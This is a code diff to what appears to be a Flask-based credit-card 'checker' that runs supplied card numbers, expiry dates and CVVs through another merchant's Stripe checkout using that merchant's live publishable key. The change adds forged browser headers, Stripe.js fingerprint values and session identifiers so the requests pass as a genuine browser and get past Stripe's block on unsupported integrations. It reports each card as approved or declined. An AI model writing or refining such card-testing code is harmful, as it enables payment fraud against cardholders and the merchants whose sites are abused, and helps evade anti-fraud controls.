@@ -8,10 +8,7 @@ app = Flask(__name__)
 
 def full_stripe_check(cc, mm, yy, cvv):
     session = requests.Session()
-    session.headers.update({
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
-    })
-
+    
     if len(yy) == 4:
         yy = yy[-2:]
 
@@ -41,62 +38,69 @@ def full_stripe_check(cc, mm, yy, cvv):
             return {"status": "Declined", "response": "Failed to get payment nonce.", "decline_type": "process_error"}
         ajax_nonce = payment_nonce_match.group(1)
 
-        # Step 5: Get Stripe payment token
+        # Step 5: Get Stripe payment token - USING EXACT SAME REQUEST AS gate.py
+        stripe_headers = {
+            'accept': 'application/json',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'priority': 'u=1, i',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+        }
+
         stripe_data = {
             'type': 'card',
             'card[number]': cc,
             'card[cvc]': cvv,
             'card[exp_year]': yy,
             'card[exp_month]': mm,
-            'key': 'pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO'
+            'allow_redisplay': 'unspecified',
+            'billing_details[address][country]': 'US',
+            'pasted_fields': 'number',
+            'payment_user_agent': 'stripe.js/fb4c8a3a98; stripe-js-v3/fb4c8a3a98; payment-element; deferred-intent',
+            'referrer': 'https://orevaa.com',
+            'time_on_page': '293254',
+            'client_attribution_metadata[client_session_id]': 'dd158add-28af-4b7c-935c-a60ace5af345',
+            'client_attribution_metadata[merchant_integration_source]': 'elements',
+            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
+            'client_attribution_metadata[merchant_integration_version]': '2021',
+            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
+            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
+            'client_attribution_metadata[elements_session_config_id]': '15bdff4a-ba92-40aa-94e4-f0e376053c81',
+            'guid': '6238c6c1-7a1e-4595-98af-359c1e147853c2bbaa',
+            'muid': '2c200dbe-43a4-4a5f-a742-4d870099146696a4b8',
+            'sid': 'a8893943-0bc5-4610-8232-e0f68a4ec4cc0e40de',
+            'key': 'pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO',
+            '_stripe_version': '2024-06-20',
         }
+
+        stripe_response = session.post(
+            'https://api.stripe.com/v1/payment_methods', 
+            headers=stripe_headers, 
+            data=stripe_data
+        )
         
-        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data)
-        
-        # DEBUG: Print the actual response
         print(f"Stripe Status: {stripe_response.status_code}")
-        print(f"Stripe Headers: {dict(stripe_response.headers)}")
-        print(f"Stripe Response Text: {stripe_response.text}")
+        print(f"Stripe Response: {stripe_response.text}")
         
-        # Check if we got the integration error
-        if "integration surface is unsupported" in stripe_response.text:
-            # Try alternative approach - use the exact same request as in gate.py
-            return {"status": "Declined", "response": "Stripe blocked the request. Need to use browser-like headers.", "decline_type": "process_error"}
-        
-        # Extract payment token
-        response_text = stripe_response.text
-        
-        # Try multiple regex patterns to find the payment token
-        patterns = [
-            r'"id":\s*"(pm_[^"]+)"',
-            r'id":\s*"(pm_[^"]+)"',
-            r'pm_[a-zA-Z0-9_]+',
-            r'"payment_method":\s*"(pm_[^"]+)"'
-        ]
-        
-        payment_token = None
-        for pattern in patterns:
-            match = re.search(pattern, response_text)
-            if match:
-                if pattern == r'pm_[a-zA-Z0-9_]+':
-                    payment_token = match.group(0)
-                else:
-                    payment_token = match.group(1)
-                break
-        
-        if payment_token and payment_token.startswith('pm_'):
-            print(f"Successfully extracted payment token: {payment_token}")
+        if stripe_response.status_code == 200:
+            stripe_json = stripe_response.json()
+            payment_token = stripe_json.get('id')
+            
+            if payment_token and payment_token.startswith('pm_'):
+                print(f"Successfully extracted payment token: {payment_token}")
+            else:
+                return {"status": "Declined", "response": "No payment token in successful response", "decline_type": "process_error"}
         else:
-            # Try JSON parsing as fallback
-            try:
-                stripe_json = stripe_response.json()
-                payment_token = stripe_json.get('id')
-                if payment_token and payment_token.startswith('pm_'):
-                    print(f"Successfully extracted payment token from JSON: {payment_token}")
-                else:
-                    return {"status": "Declined", "response": f"No valid payment token found. Response: {response_text[:200]}", "decline_type": "process_error"}
-            except:
-                return {"status": "Declined", "response": f"Failed to parse response: {response_text[:200]}", "decline_type": "process_error"}
+            error_msg = stripe_response.json().get('error', {}).get('message', 'Stripe API error')
+            return {"status": "Declined", "response": f"Stripe error: {error_msg}", "decline_type": "process_error"}
 
         # Step 6: Submit to website
         site_data = {
